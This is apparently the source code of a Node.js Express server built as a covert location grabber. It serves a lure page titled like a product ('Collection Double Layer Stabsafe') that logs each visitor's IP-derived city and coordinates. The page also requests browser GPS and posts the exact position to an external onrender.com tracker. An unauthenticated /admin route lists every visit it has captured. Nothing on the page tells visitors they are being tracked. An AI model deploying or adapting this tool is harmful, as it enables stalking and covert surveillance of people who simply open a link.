const express = require('express');
const https = require('https');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());

app.set('trust proxy', true);

const visits = [];

// MAIN PAGE
app.get('/', (req, res) => {

    const ip =
        req.headers['x-forwarded-for'] ||
        req.socket.remoteAddress;

    https.get(`https://ipwho.is/${ip}`, (response) => {

        let data = '';

        response.on('data', (chunk) => {
            data += chunk;
        });

        response.on('end', () => {

            const location = JSON.parse(data);

            const info = {
                ip: ip,
                city: location.city,
                region: location.region,
                country: location.country,
                latitude: location.latitude,
                longitude: location.longitude,
                time: new Date()
            };

            visits.push(info);

            console.log(info);

            res.send(`
                <html>
                <head>
                    <title>Collection Double Layer Stabsafe</title>
                </head>

                <body>

                    <h1>Collection Double Layer Stabsafe</h1>
                    <p>Please allow location access.</p>

                    <script>

                    navigator.geolocation.getCurrentPosition(

                        (position) => {

                            fetch('https://tracker-nub5.onrender.com/save-location', {

                                method: 'POST',

                                headers: {
                                    'Content-Type': 'application/json'
                                },

                                body: JSON.stringify({
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                })

                            });

                        },

                        (error) => {
                            console.log(error);
                        }

                    );

                    </script>

                </body>
                </html>
            `);

        });

    }).on('error', (err) => {

        console.log(err);

        res.send('Error');

    });

});

// SAVE GPS LOCATION
app.post('/save-location', (req, res) => {

    const gps = {
        latitude: req.body.latitude,
        longitude: req.body.longitude,
        exact_time: new Date()
    };

    visits.push(gps);

    console.log(gps);

    res.sendStatus(200);

});

// ADMIN PANEL
app.get('/admin', (req, res) => {

    res.json(visits);

});

// START SERVER
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {

    console.log(`Server running on port ${PORT}`);

});